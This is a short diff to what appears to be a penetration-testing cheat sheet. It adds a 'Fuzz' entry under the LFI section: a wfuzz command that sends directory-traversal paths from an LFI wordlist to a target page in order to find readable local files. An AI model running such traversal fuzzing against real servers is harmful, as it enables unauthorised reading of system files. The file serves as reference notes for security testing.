@@ -40,6 +40,7 @@
 	- [GetSystem](#getsystem)
 	- [Local Exploits](#local-exploits)
 - [LFI](#lfi)
+	- [Fuzz](#fuzz)
 	- [View php code](#view-php-code)
 	- [View access.log](#view-accesslog)
 	- [Command injection](#command-injection)
@@ -298,6 +299,11 @@ options
 ```
 
 ## LFI
+
+### Fuzz
+```
+wfuzz --hw 0 -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt http://$IP/page=../../../../../../../../..FUZZ
+```
 
 ### View php code
 ```
